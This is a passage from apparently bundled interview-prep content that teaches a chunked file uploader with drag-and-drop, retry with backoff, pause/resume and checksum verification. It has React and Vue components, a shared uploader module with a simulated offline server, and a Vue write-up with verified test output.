        </label>
        <label>
          <input
            type="checkbox"
            data-testid="offline"
            checked={offline}
            onChange={(e) => {
              setOffline(e.target.checked);
              server.current.setOffline(e.target.checked);
            }}
          />{" "}
          Simulate offline
        </label>
      </div>
      <div
        className={"up-zone" + (dragging ? " over" : "")}
        data-testid="zone"
        onDragEnter={onDragEnter}
        onDragLeave={onDragLeave}
        onDragOver={onDragOver}
        onDrop={onDrop}
      >
        <p>{dragging ? "Release to upload" : "Drag files here"}</p>
        <button type="button" onClick={() => inputRef.current.click()}>
          Browse files
        </button>
        <input
          ref={inputRef}
          type="file"
          multiple
          hidden
          data-testid="picker"
          onChange={(e) => {
            addFiles(e.target.files);
            e.target.value = "";
          }}
        />
      </div>
      <ul className="up-list" aria-label="Uploads">
        {uploads.map((u) => {
          const pct =
            Math.round((u.bytes / Math.max(u.size, 1)) * 100) ||
            (u.status === "done" ? 100 : 0);
          const c = controllers.current.get(u.id);
          return (
            <li key={u.id} data-upload={u.name}>
              <div className="up-row">
                <strong>{u.name}</strong>
                <span className="up-meta">
                  {fmtBytes(u.size)} · chunk {u.done}/{u.total}
                  {u.retried ? \` · \${u.retried} retried\` : ""}
                </span>
              </div>
              <div
                role="progressbar"
                aria-label={\`\${u.name} upload\`}
                aria-valuemin={0}
                aria-valuemax={100}
                aria-valuenow={pct}
                className="up-bar"
              >
                <div
                  style={{ width: pct + "%" }}
                  className={"up-fill " + u.status}
                />
              </div>
              <div className="up-row">
                <span
                  className="up-status"
                  data-testid="status"
                  aria-live="polite"
                >
                  {u.status}
                  {u.message ? ": " + u.message : ""}
                </span>
                <span>
                  {u.status === "uploading" && (
                    <button type="button" onClick={() => c.pause()}>
                      Pause
                    </button>
                  )}
                  {u.status === "paused" && (
                    <button type="button" onClick={() => c.resume()}>
                      Resume
                    </button>
                  )}
                  {u.status === "error" && (
                    <button type="button" onClick={() => c.retry()}>
                      Retry
                    </button>
                  )}
                </span>
              </div>
            </li>
          );
        })}
      </ul>
    </div>
  );
}
`,
          "/src/uploader.js": `// Framework-free chunked upload logic plus a SIMULATED server (no network).
export const CHUNK_SIZES = [
  { label: "1 KB", value: 1024 },
  { label: "4 KB", value: 4096 },
  { label: "64 KB", value: 65536 },
  { label: "1 MB", value: 1048576 },
  { label: "5 MB", value: 5242880 },
];
export const fmtBytes = (n) =>
  n < 1024
    ? n + " B"
    : n < 1048576
      ? (n / 1024).toFixed(1) + " KB"
      : (n / 1048576).toFixed(1) + " MB";

// [start, end) byte ranges. A 0-byte file still gets one (empty) chunk.
export function chunkPlan(size, chunkSize) {
  const total = Math.max(1, Math.ceil(size / chunkSize));
  return Array.from({ length: total }, (_, i) => ({
    index: i,
    start: i * chunkSize,
    end: Math.min(size, (i + 1) * chunkSize),
  }));
}

// FNV-1a over the bytes: lets the "server"
// prove the reassembled file is identical.
export async function checksum(blob) {
  const bytes = new Uint8Array(await blob.arrayBuffer());
  let h = 0x811c9dc5;
  for (const b of bytes) {
    h ^= b;
    h = Math.imul(h, 0x01000193) >>> 0;
  }
  return h.toString(16).padStart(8, "0");
}

const abortError = () =>
  Object.assign(new Error("Aborted"), { name: "AbortError" });

// Simulated upload endpoint. Every 4th chunk fails its first attempt (a flaky
// network), and setOffline(true) makes every request fail.
export function createFakeServer({ latency = 120 } = {}) {
  const uploads = new Map();
  const tries = new Map();
  let offline = false;
  return {
    setOffline(v) {
      offline = v;
    },
    uploadChunk({ uploadId, index, blob, signal }) {
      return new Promise((resolve, reject) => {
        if (signal?.aborted) return reject(abortError());
        const t = setTimeout(() => {
          signal?.removeEventListener("abort", onAbort);
          const key = uploadId + ":" + index;
          tries.set(key, (tries.get(key) || 0) + 1);
          if (offline) return reject(new Error("Network error"));
          if (index % 4 === 3 && tries.get(key) === 1)
            return reject(new Error("503 Service Unavailable"));
          if (!uploads.has(uploadId)) uploads.set(uploadId, new Map());
          uploads.get(uploadId).set(index, blob);
          resolve({ index, received: blob.size });
        }, latency);
        const onAbort = () => {
          clearTimeout(t);
          reject(abortError());
        };
        signal?.addEventListener("abort", onAbort, { once: true });
      });
    },
    async complete(uploadId, total) {
      const parts = uploads.get(uploadId);
      const ordered = Array.from({ length: total }, (_, i) => parts?.get(i));
      if (ordered.some((p) => !p)) throw new Error("Missing chunks");
      const file = new Blob(ordered);
      return { size: file.size, checksum: await checksum(file) };
    },
  };
}

let seq = 0;
// One upload = one file. onUpdate(snapshot)
// is called after every change; the UI
// renders snapshots and never touches this object's internals.
export function createUpload(
  file,
  chunkSize,
  server,
  onUpdate,
  { concurrency = 2, retries = 3, backoff = 100 } = {},
) {
  const id = "u" + ++seq;
  const plan = chunkPlan(file.size, chunkSize);
  const done = new Set();
  const inflight = new Map(); // index -> AbortController
  let status = "uploading",
    message = "",
    retried = 0,
    failed = null;

  const snapshot = () => ({
    id,
    name: file.name,
    size: file.size,
    total: plan.length,
    done: done.size,
    status,
    message,
    retried,
    bytes: [...done].reduce((n, i) => n + plan[i].end - plan[i].start, 0),
  });
  const emit = () => onUpdate(snapshot());
  const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

  async function send(chunk) {
    const ctrl = new AbortController();
    inflight.set(chunk.index, ctrl);
    try {
      for (let attempt = 1; ; attempt++) {
        try {
          await server.uploadChunk({
            uploadId: id,
            index: chunk.index,
            blob: file.slice(chunk.start, chunk.end),
            signal: ctrl.signal,
          });
          done.add(chunk.index);
          return;
        } catch (e) {
          // paused: will be re-sent on resume
          if (e.name === "AbortError" || status !== "uploading") return;
          if (attempt > retries) {
            failed = chunk.index;
            message = \`Chunk \${chunk.index + 1} failed after \${attempt} attempts: \${e.message}\`;
            return;
          }
          retried++;
          emit();
          await sleep(backoff * 2 ** (attempt - 1)); // 100, 200, 400 ms
          if (status !== "uploading") return;
        }
      }
    } finally {
      inflight.delete(chunk.index);
    }
  }

  function pump() {
    if (status !== "uploading") return;
    if (failed !== null) {
      status = "error";
      for (const c of inflight.values()) c.abort();
      emit();
      return;
    }
    if (done.size === plan.length) {
      finish();
      return;
    }
    for (const chunk of plan) {
      if (inflight.size >= concurrency) break;
      if (done.has(chunk.index) || inflight.has(chunk.index)) continue;
      send(chunk).then(() => {
        emit();
        pump();
      });
    }
  }

  async function finish() {
    status = "verifying";
    emit();
    const [server_, local] = await Promise.all([
      server.complete(id, plan.length),
      checksum(file),
    ]);
    const ok = server_.size === file.size && server_.checksum === local;
    status = ok ? "done" : "error";
    message = ok
      ? \`Verified: \${fmtBytes(server_.size)}, checksum \${local}\`
      : "Checksum mismatch";
    emit();
  }

  const api = {
    id,
    pause() {
      if (status !== "uploading") return;
      status = "paused";
      for (const c of inflight.values()) c.abort();
      emit();
    },
    resume() {
      if (status !== "paused") return;
      status = "uploading";
      emit();
      pump();
    },
    retry() {
      if (status !== "error" || failed === null) return;
      failed = null;
      message = "";
      status = "uploading";
      emit();
      pump();
    },
    cancel() {
      status = "cancelled";
      for (const c of inflight.values()) c.abort();
      emit();
    },
  };
  queueMicrotask(() => {
    emit();
    pump();
  });
  return api;
}
`,
        },
      },
      vue: {
        answer: `**Target Audience:** Vue developers preparing for a machine coding round. Assumes \`<script setup>\`, \`ref\` and event modifiers.
**Difficulty:** Hard

> **How to read this doc:** Plain words first, then a <code>📌 Interview term:</code> callout. "Verified" output was printed by the real code: this Vue 3.5.44 component in jsdom against a simulated server with real timers, and in headless Chromium 141 with a real \`DragEvent\` and a real file chooser.

## 1. Why This Even Matters — A Story First

Nobody moves house in one giant box. Movers use many small boxes and carry two at a time. A box that slips gets picked up again. If it rains, they pause and later carry only the boxes still in the van, and at the end someone checks the inventory. A chunked uploader does exactly that with \`Blob.slice\`, a two-request pump, retries with backoff, pause by aborting, and a checksum.

## 2. Plan and the Vue State Model

| Piece | Vue tool | Notes |
| :--- | :--- | :--- |
| Upload logic | \`uploader.js\`, no Vue | Shared with React and Angular. |
| Simulated server | a plain \`const\` in \`<script setup>\` | Created once per component instance. |
| Controllers | a plain \`Map\` | Objects with methods; never rendered, so not reactive. |
| \`uploads\` | \`ref([])\` of snapshots | One plain object per file, replaced on each update. |
| \`chunkSize\`, \`offline\`, \`dragging\` | \`ref\` | \`watch(offline)\` forwards the switch to the server. |
| \`dragDepth\` | plain \`let\` | The template never reads it. |

📌 **Interview term: Snapshot** — \`createUpload(file, chunkSize, server, onUpdate)\` calls \`onUpdate({ id, name, size, total, done, bytes, status, message, retried })\` after every change. Vue renders snapshots. The live controller (with its \`Set\`s and \`AbortController\`s) never becomes reactive, which avoids proxying objects that the template does not need ([common reactivity caveats](/interview-question/what-are-common-reactivity-caveats-in-vue)).

## 3. Build It Step by Step

### 3.1 Chunk plan and the fake endpoint

\`chunkPlan(size, chunkSize)\` returns \`{ index, start, end }\` ranges; \`Math.max(1, ...)\` gives a 0-byte file one empty chunk. \`file.slice(start, end)\` is lazy, so no chunk is read until it is sent.

The simulated server waits 120 ms per request, honours an \`AbortSignal\`, and fails every 4th chunk on its first attempt (a deterministic flaky network). \`setOffline(true)\` makes every request fail. \`complete()\` reassembles the stored parts by index and returns size plus an FNV-1a checksum, which the client compares with its own.

📌 **Interview term: \`Blob.slice\`** — a byte-range view of a file without loading it; the basis of every chunked upload.

### 3.2 Retry, backoff and the pump

Each chunk is sent by \`send(chunk)\`:

- It tries up to 4 times, waiting 100, 200 and 400 ms between failures.
- It stops quietly on an \`AbortError\` or when the upload is no longer \`"uploading"\`.

A \`pump()\` tops the in-flight count up to 2, and every finished \`send\` calls it again. Pause aborts the in-flight controllers. Resume and Retry call \`pump()\`, which sends only chunks that are not in \`done\`.

📌 **Interview term: Exponential backoff** — waiting longer after each failure; add jitter in production ([promiseRetry with backoff](/interview-question/implement-promiseretry-fn-retries-delay-with-exponential-backoff)).

📌 **Interview term: Concurrency limit** — at most N requests at once, refilled as each ends ([p-limit](/interview-question/implement-p-limit-concurrency-limiter-for-async-tasks)).

### 3.3 The component

\`\`\`js
const server = createFakeServer({ latency: 120 });
const controllers = new Map();
const uploads = ref([]);
let dragDepth = 0;

watch(offline, (v) => server.setOffline(v));
onBeforeUnmount(() => controllers.forEach((c) => c.cancel()));

function addFiles(list) {
  for (const file of Array.from(list || [])) {
    const ctrl = createUpload(file, chunkSize.value, server, (snap) => {
      const i = uploads.value.findIndex((u) => u.id === snap.id);
      if (i === -1) uploads.value.push(snap);
      else uploads.value[i] = snap;
    });
    controllers.set(ctrl.id, ctrl);
  }
}
function onDragEnter() {
  dragDepth++;
  dragging.value = true;
}
function onDragLeave() {
  if (--dragDepth <= 0) {
    dragDepth = 0;
    dragging.value = false;
  }
}
function onDragOver(e) {
  if (e.dataTransfer) e.dataTransfer.dropEffect = "copy";
}
function onDrop(e) {
  dragDepth = 0;
  dragging.value = false;
  addFiles(e.dataTransfer?.files);
}
\`\`\`

\`\`\`vue
<div
  :class="['up-zone', { over: dragging }]"
  data-testid="zone"
  @dragenter.prevent.stop="onDragEnter"
  @dragleave.prevent.stop="onDragLeave"
  @dragover.prevent.stop="onDragOver"
  @drop.prevent.stop="onDrop"
>
  <p>{{ dragging ? "Release to upload" : "Drag files here" }}</p>
  <button type="button" @click="picker.click()">Browse files</button>
  <input ref="picker" type="file" multiple hidden @change="onPick" />
</div>
\`\`\`

📌 **Interview term: Drop target** — \`@dragover.prevent\` is what makes the zone accept a drop. Without it \`drop\` never fires, and the browser opens the file instead ([event modifiers](/interview-question/how-do-you-handle-events-in-vue-v-on-and-event-modifiers)).

📌 **Interview term: Drag depth counter** — entering the zone's own \`<p>\` or \`<button>\` fires \`dragenter\` on the child and \`dragleave\` on the zone. Counting enters minus leaves keeps the highlight steady.

Assigning \`uploads.value[i] = snap\` is reactive in Vue 3, because the array is a proxy ([how reactivity works](/interview-question/how-does-vue-s-reactivity-system-work)). Each row renders \`role="progressbar"\` with \`:aria-valuenow\`, and an \`aria-live="polite"\` status. \`onPick\` clears the input's \`value\`, so the same file can be picked again.

## 4. Verified

jsdom has \`File\` and \`Blob.slice\` but no \`DragEvent\` or \`DataTransfer\`. So the driver dispatched plain events with a fake \`dataTransfer = { files, dropEffect }\`, and set the file input's \`files\` itself. React and Angular printed identical lines:

\`\`\`text
dragenter x2, dragleave x1 -> zone class: up-zone over | Release to upload
dragover defaultPrevented: true | dropEffect: copy
drop notes.txt (1 KB chunks) -> 10.3 KB · chunk 0/11 | 0% | uploading | buttons: Pause | zone class: up-zone
first retry (~240 ms) -> 10.3 KB · chunk 3/11 · 1 retried | 29% | uploading | buttons: Pause
paused -> 10.3 KB · chunk 3/11 · 1 retried | 29% | paused | buttons: Resume || 500 ms later: 10.3 KB · chunk 3/11 · 1 retried | 29% | paused | buttons: Resume
resumed, finished in under 2 s -> 10.3 KB · chunk 11/11 · 2 retried | 100% | done: Verified: 10.3 KB, checksum 4470522a | buttons: none
picker photo.bin (4 KB chunks, offline) -> 8.8 KB · chunk 0/3 | 0% | uploading | buttons: Pause
offline -> 8.8 KB · chunk 0/3 · 6 retried | 0% | error: Chunk 1 failed after 4 attempts: Network error | buttons: Retry
online + Retry -> 8.8 KB · chunk 3/3 · 6 retried | 100% | done: Verified: 8.8 KB, checksum 63afb8cd | buttons: none
0-byte file -> 0 B · chunk 1/1 | 100% | done: Verified: 0 B, checksum 811c9dc5 | buttons: none
\`\`\`

The snapshot is taken when the first retry appears (about 240 ms), not after a fixed sleep. A fixed 300 ms read printed \`3/11\` or \`4/11\` depending on timer jitter, because the next chunk lands at about 360 ms. The finish time is only checked to be under 2 s.

Headless Chromium 141 (playwright-core), with a real \`DataTransfer\` and \`DragEvent\`s and Playwright's file chooser:

\`\`\`text
[chromium:vue] DragEvent prevented enter/over/drop: true/true/true | class while over: "up-zone over" | drag.txt: done: Verified: 4.9 KB, checksum 616035e5 | picked.txt: done: Verified: 2.9 KB, checksum 02f9fe2d | console errors: none
\`\`\`

Styling, screen reader output and a real network were not checked. The server is simulated.

## 5. Edge Cases and Accessibility

| Concern | Handling |
| :--- | :--- |
| 0-byte file | One empty chunk |
| Pause during backoff | \`send\` re-checks \`status\` after the sleep |
| Out-of-order arrival | The server stores parts by index |
| Unmount mid-upload | \`onBeforeUnmount\` cancels all controllers |
| Keyboard | A real Browse button |
| Progress | \`role="progressbar"\`, \`aria-valuenow\`, live status |

## 6. Common Pitfalls

- **Missing \`.prevent\` on \`dragover\`.** No drop event, and the file opens in the tab.
- **A boolean highlight without a depth counter.** It flickers over child elements.
- **Making controllers reactive.** Vue proxies \`Set\`s and \`AbortController\`s for nothing; render snapshots instead.
- **Restarting at chunk 0 on resume.** Send only chunks that were not acknowledged.
- **Retrying 4xx errors.** Retry network errors and 5xx only.

## 7. How to Answer in an Interview

<div style="background:#1c140a;border:2px solid #f9a825;border-radius:10px;padding:20px 24px;margin:20px 0;">

<div style="color:#ffca28;font-size:1.15em;font-weight:bold;margin-bottom:16px;">🎤 How to Answer in an Interview</div>

<div style="color:#e0a83e;font-size:0.8em;font-weight:bold;text-transform:uppercase;letter-spacing:0.6px;margin:0 0 10px 0;">The 60-Second Answer</div>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">1. Plan:</strong> <span style="color:#f0e2c8;">"<code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">Blob.slice</code> ranges from <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">chunkPlan</code>, with one empty chunk for a 0-byte file."</span>
</blockquote>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">2. Controller:</strong> <span style="color:#f0e2c8;">"A framework-free <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">createUpload</code> with a pump holding 2 requests in flight, <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">done</code> and <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">inflight</code> sets, and snapshots out."</span>
</blockquote>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">3. Failure:</strong> <span style="color:#f0e2c8;">"Backoff of 100, 200 and 400 ms, giving up after 4 attempts, and Retry resumes from the missing chunks."</span>
</blockquote>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">4. Pause:</strong> <span style="color:#f0e2c8;">"Abort the in-flight controllers; resume sends only the rest; a checksum verifies the result."</span>
</blockquote>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">5. Vue layer:</strong> <span style="color:#f0e2c8;">"A plain <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">Map</code> of controllers, a <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">ref</code> of snapshots, <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">@dragover.prevent</code>, a depth counter and a <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">progressbar</code>."</span>
</blockquote>

<div style="color:#e0a83e;font-size:0.8em;font-weight:bold;text-transform:uppercase;letter-spacing:0.6px;margin:22px 0 10px 0;border-top:1px solid #4a3a1a;padding-top:16px;">Follow-Up Questions to Expect</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:12px 0 0 0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">Why not <code style="background:#4a3418;color:#ffe0b2;padding:1px 5px;border-radius:3px;">reactive(createUpload(...))</code>?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0 0 14px 0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;">The controller holds <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">Set</code>s, promises and <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">AbortController</code>s the template never reads. Snapshots are smaller and cannot be mutated by the view.</span>
</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">How would you resume after a reload?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0 0 14px 0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;">Persist the upload id and a file fingerprint, ask the server which parts it has, and have the user pick the file again.</span>
</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">Smoother progress inside a chunk?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0 0 14px 0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;"><code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">XMLHttpRequest</code> with <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">xhr.upload.onprogress</code>, because <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">fetch</code> has no upload progress events.</span>
</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">Many files at once?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;">A shared queue with a global limit across files, so 50 files do not open 100 connections.</span>
</div>

</div>

## 8. Quick Glossary

| Term | Plain meaning |
| :--- | :--- |
| **Snapshot** | A plain copy of upload state for rendering |
| **\`Blob.slice\`** | A lazy byte range of a file |
| **Exponential backoff** | Longer waits after each failure |
| **Concurrency limit** | At most N requests at once |
| **Drop target** | An element whose \`dragover\` is prevented |
| **Drag depth counter** | Enters minus leaves |

---
**Conclusion:** The Vue uploader keeps all upload logic in a framework-free controller: lazy \`Blob.slice\` chunks, a two-request pump, retry with backoff, pause by abort, and a checksum. The component only holds snapshots and drag state, with \`.prevent\` modifiers on the drag events and a depth counter for the highlight. jsdom and real Chromium both confirmed the behaviour.`,
        files: {
          "/src/App.vue": `<script setup>
import FileUploader from "./components/FileUploader.vue";
</script>

<template>
  <main class="page">
    <h1 style="font-size: 18px">Upload files</h1>
    <FileUploader />
  </main>
</template>

<style>
body {
  margin: 0;
  background: #0f1115;
  color: #e6e6e6;
  font-family: system-ui, sans-serif;
}
.page {
  max-width: 600px;
  margin: 0 auto;
  padding: 20px 16px;
}
.up-opts {
  display: flex;
  flex-wrap: wrap;
  gap: 16px;
  align-items: center;
  font-size: 14px;
  margin-bottom: 10px;
  color: #c9d1d9;
}
select {
  background: #171a21;
  color: #e6e6e6;
  border: 1px solid #2c3340;
  border-radius: 6px;
  padding: 4px 6px;
}
.up-zone {
  border: 2px dashed #3a4250;
  border-radius: 12px;
  padding: 28px 16px;
  text-align: center;
  background: #13161c;
  transition:
    background 0.15s,
    border-color 0.15s;
}
.up-zone.over {
  border-color: #f9a825;
  background: #1c140a;
}
.up-zone p {
  margin: 0 0 10px;
  color: #9aa4b2;
}
button {
  background: #222834;
  color: #e6e6e6;
  border: 1px solid #2c3340;
  border-radius: 8px;
  padding: 5px 12px;
  cursor: pointer;
  font: inherit;
  font-size: 13px;
}
.up-list {
  list-style: none;
  padding: 0;
  margin: 16px 0 0;
  display: flex;
  flex-direction: column;
  gap: 10px;
}
.up-list li {
  background: #171a21;
  border: 1px solid #2c3340;
  border-radius: 10px;
  padding: 10px 12px;
}
.up-row {
  display: flex;
  justify-content: space-between;
  gap: 8px;
  align-items: center;
  flex-wrap: wrap;
  font-size: 14px;
}
.up-meta,
.up-status {
  color: #9aa4b2;
  font-size: 12px;
  word-break: break-word;
}
.up-bar {
  height: 6px;
  background: #262c36;
  border-radius: 3px;
  margin: 8px 0;
  overflow: hidden;
}
.up-fill {
  height: 100%;
  background: #f9a825;
  transition: width 0.2s;
}
.up-fill.done {
  background: #66bb6a;
}
.up-fill.error {
  background: #ef5350;
}
.up-fill.paused {
  background: #8b949e;
}
</style>
`,
          "/src/components/FileUploader.vue": `<script setup>
import { onBeforeUnmount, ref, useTemplateRef, watch } from "vue";
import {
  CHUNK_SIZES,
  createFakeServer,
  createUpload,
  fmtBytes,
} from "../uploader.js";

// simulated endpoint, created once per component
const server = createFakeServer({ latency: 120 });
const controllers = new Map(); // upload id -> controller: plain, not reactive
const uploads = ref([]); // snapshots, in the order files were added
const chunkSize = ref(1024);
const offline = ref(false);
const dragging = ref(false);
const picker = useTemplateRef("picker");
let dragDepth = 0; // dragenter/dragleave also fire for children

watch(offline, (v) => server.setOffline(v));
onBeforeUnmount(() => controllers.forEach((c) => c.cancel()));

function addFiles(list) {
  for (const file of Array.from(list || [])) {
    const ctrl = createUpload(file, chunkSize.value, server, (snap) => {
      const i = uploads.value.findIndex((u) => u.id === snap.id);
      if (i === -1) uploads.value.push(snap);
      else uploads.value[i] = snap;
    });
    controllers.set(ctrl.id, ctrl);
  }
}
function onDragEnter() {
  dragDepth++;
  dragging.value = true;
}
function onDragLeave() {
  if (--dragDepth <= 0) {
    dragDepth = 0;
    dragging.value = false;
  }
}
function onDragOver(e) {
  if (e.dataTransfer) e.dataTransfer.dropEffect = "copy";
} // .prevent is required, or drop never fires
function onDrop(e) {
  dragDepth = 0;
  dragging.value = false;
  addFiles(e.dataTransfer?.files);
}
function onPick(e) {
  addFiles(e.target.files);
  e.target.value = "";
}
const pct = (u) =>
  Math.round((u.bytes / Math.max(u.size, 1)) * 100) ||
  (u.status === "done" ? 100 : 0);
</script>

<template>
  <div class="up">
    <div class="up-opts">
      <label>Chunk size
        <select data-testid="chunk" v-model.number="chunkSize">
          <option
            v-for="c in CHUNK_SIZES"
            :key="c.value"
            :value="c.value"
          >{{ c.label }}</option>
        </select>
      </label>
      <label><input type="checkbox" data-testid="offline" v-model="offline" /> Simulate offline</label>
    </div>
    <div :class="['up-zone', { over: dragging }]" data-testid="zone"
      @dragenter.prevent.stop="onDragEnter" @dragleave.prevent.stop="onDragLeave"
      @dragover.prevent.stop="onDragOver" @drop.prevent.stop="onDrop">
      <p>{{ dragging ? "Release to upload" : "Drag files here" }}</p>
      <button type="button" @click="picker.click()">Browse files</button>
      <input
        ref="picker"
        type="file"
        multiple
        hidden
        data-testid="picker"
        @change="onPick"
      />
    </div>
    <ul class="up-list" aria-label="Uploads">
      <li v-for="u in uploads" :key="u.id" :data-upload="u.name">
        <div class="up-row">
          <strong>{{ u.name }}</strong>
          <span class="up-meta">{{ fmtBytes(u.size) }} · chunk {{ u.done }}/{{ u.total }}{{ u.retried ? \` · \${u.retried} retried\` : "" }}</span>
        </div>
        <div
          role="progressbar"
          :aria-label="\`\${u.name} upload\`"
          aria-valuemin="0"
          aria-valuemax="100"
          :aria-valuenow="pct(u)"
          class="up-bar"
        >
          <div
            :style="{ width: pct(u) + '%' }"
            :class="['up-fill', u.status]"
          ></div>
        </div>
        <div class="up-row">
          <span
            class="up-status"
            data-testid="status"
            aria-live="polite"
          >{{ u.status }}{{ u.message ? ": " + u.message : "" }}</span>
          <span>
            <button
              v-if="u.status === 'uploading'"
              type="button"
              @click="controllers.get(u.id).pause()"
            >Pause</button>
            <button
              v-else-if="u.status === 'paused'"
              type="button"
              @click="controllers.get(u.id).resume()"
            >Resume</button>
            <button
              v-else-if="u.status === 'error'"
              type="button"
              @click="controllers.get(u.id).retry()"
            >Retry</button>
          </span>
        </div>
      </li>
    </ul>
  </div>
</template>
`,
          "/src/uploader.js": `// Framework-free chunked upload logic plus a SIMULATED server (no network).
export const CHUNK_SIZES = [
  { label: "1 KB", value: 1024 },
  { label: "4 KB", value: 4096 },
  { label: "64 KB", value: 65536 },
  { label: "1 MB", value: 1048576 },
  { label: "5 MB", value: 5242880 },
];
export const fmtBytes = (n) =>
  n < 1024
    ? n + " B"
    : n < 1048576
      ? (n / 1024).toFixed(1) + " KB"
      : (n / 1048576).toFixed(1) + " MB";

// [start, end) byte ranges. A 0-byte file still gets one (empty) chunk.
export function chunkPlan(size, chunkSize) {
  const total = Math.max(1, Math.ceil(size / chunkSize));
  return Array.from({ length: total }, (_, i) => ({
    index: i,
    start: i * chunkSize,
    end: Math.min(size, (i + 1) * chunkSize),
  }));
}

// FNV-1a over the bytes: lets the "server"
// prove the reassembled file is identical.
export async function checksum(blob) {
  const bytes = new Uint8Array(await blob.arrayBuffer());
  let h = 0x811c9dc5;
  for (const b of bytes) {
    h ^= b;
    h = Math.imul(h, 0x01000193) >>> 0;
  }
  return h.toString(16).padStart(8, "0");
}

const abortError = () =>
  Object.assign(new Error("Aborted"), { name: "AbortError" });

// Simulated upload endpoint. Every 4th chunk fails its first attempt (a flaky
// network), and setOffline(true) makes every request fail.
export function createFakeServer({ latency = 120 } = {}) {
  const uploads = new Map();
  const tries = new Map();
  let offline = false;
  return {
    setOffline(v) {
      offline = v;
    },
    uploadChunk({ uploadId, index, blob, signal }) {
      return new Promise((resolve, reject) => {
        if (signal?.aborted) return reject(abortError());
        const t = setTimeout(() => {
          signal?.removeEventListener("abort", onAbort);
          const key = uploadId + ":" + index;
          tries.set(key, (tries.get(key) || 0) + 1);
          if (offline) return reject(new Error("Network error"));
          if (index % 4 === 3 && tries.get(key) === 1)
            return reject(new Error("503 Service Unavailable"));
          if (!uploads.has(uploadId)) uploads.set(uploadId, new Map());
          uploads.get(uploadId).set(index, blob);
          resolve({ index, received: blob.size });
        }, latency);
        const onAbort = () => {
          clearTimeout(t);
          reject(abortError());
        };
        signal?.addEventListener("abort", onAbort, { once: true });
      });
    },
    async complete(uploadId, total) {
      const parts = uploads.get(uploadId);
      const ordered = Array.from({ length: total }, (_, i) => parts?.get(i));
      if (ordered.some((p) => !p)) throw new Error("Missing chunks");
      const file = new Blob(ordered);
      return { size: file.size, checksum: await checksum(file) };
    },
  };
}

let seq = 0;
// One upload = one file. onUpdate(snapshot)
// is called after every change; the UI
// renders snapshots and never touches this object's internals.
export function createUpload(
  file,
  chunkSize,
  server,
  onUpdate,
  { concurrency = 2, retries = 3, backoff = 100 } = {},
) {
  const id = "u" + ++seq;
  const plan = chunkPlan(file.size, chunkSize);
  const done = new Set();
  const inflight = new Map(); // index -> AbortController
  let status = "uploading",
    message = "",
    retried = 0,
    failed = null;

  const snapshot = () => ({
    id,
    name: file.name,
    size: file.size,
    total: plan.length,
    done: done.size,
    status,
    message,
    retried,
    bytes: [...done].reduce((n, i) => n + plan[i].end - plan[i].start, 0),
  });
  const emit = () => onUpdate(snapshot());
  const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

  async function send(chunk) {
    const ctrl = new AbortController();
    inflight.set(chunk.index, ctrl);
    try {
      for (let attempt = 1; ; attempt++) {
        try {
          await server.uploadChunk({
            uploadId: id,
            index: chunk.index,
            blob: file.slice(chunk.start, chunk.end),
            signal: ctrl.signal,
          });
          done.add(chunk.index);
          return;
        } catch (e) {
          // paused: will be re-sent on resume
          if (e.name === "AbortError" || status !== "uploading") return;
          if (attempt > retries) {
            failed = chunk.index;
            message = \`Chunk \${chunk.index + 1} failed after \${attempt} attempts: \${e.message}\`;
            return;
          }
          retried++;
          emit();
          await sleep(backoff * 2 ** (attempt - 1)); // 100, 200, 400 ms
          if (status !== "uploading") return;
        }
      }
    } finally {
